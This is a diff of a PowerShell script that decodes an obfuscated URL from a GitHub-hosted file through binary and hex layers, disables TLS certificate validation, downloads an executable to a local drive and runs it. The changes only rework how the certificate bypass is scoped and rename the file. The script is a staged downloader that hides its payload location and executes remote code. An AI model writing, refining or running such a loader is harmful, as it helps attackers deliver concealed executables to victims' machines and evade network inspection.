@@ -43,15 +43,6 @@ Function Convert-HexToText {
     return -join $asciiOutput
 }
 
-# Function to ignore SSL/TLS certificate validation
-Function Ignore-SSLCertificateValidation {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
-}
-
-# Call the function to ignore SSL/TLS certificate validation
-Ignore-SSLCertificateValidation
-
 # URL of the hosted text file
 $url = "https://raw.githubusercontent.com/notforuseactually/404/main/4.txt" # Replace this with the actual URL containing the custom encoded string
 
@@ -76,23 +67,29 @@ $hexText = Convert-BinaryToText -binaryInput $binaryString
 Write-Host "Hex string from binary:"
 Write-Host $hexText
 
+
 # Convert the hex string to ASCII text (URL)
 $finalUrl = Convert-HexToText -hexInput $hexText
 $finalUrl = $finalUrl + 'e'
-
 
 # Display the final URL for troubleshooting
 Write-Host "Final URL from hex:"
 Write-Host $finalUrl
 
 # Specify the location where the file will be downloaded
-$downloadPath = "S:\D0wnloadedFile.exe" # Change to your desired path and filename
+$downloadPath = "S:\Downloaded.exe" # Change to your desired path and filename
 
-# Function to download the file from the URL
-Function Download-File {
-    Param ([string]$url, [string]$path)
-    Invoke-WebRequest -Uri $url -OutFile $path -SkipCertificateCheck -ErrorAction Stop
-}
+# Save the current certificate validation callback
+$originalCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback
+
+# Bypass SSL certificate validation only for the last URL
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+# Download the file from the final URL
+Invoke-WebRequest -Uri $finalUrl -OutFile $downloadPath -ErrorAction Stop
+
+# Restore the original certificate validation callback to enforce certificate checks again
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCallback
 
 # Function to execute the downloaded file
 Function Execute-File {
@@ -104,8 +101,6 @@ Function Execute-File {
     }
 }
 
-# Proceed with downloading the file using the modified URL
-Download-File -url $finalUrl -path $downloadPath
-
 # Execute the downloaded file
 Execute-File -filePath $downloadPath
+
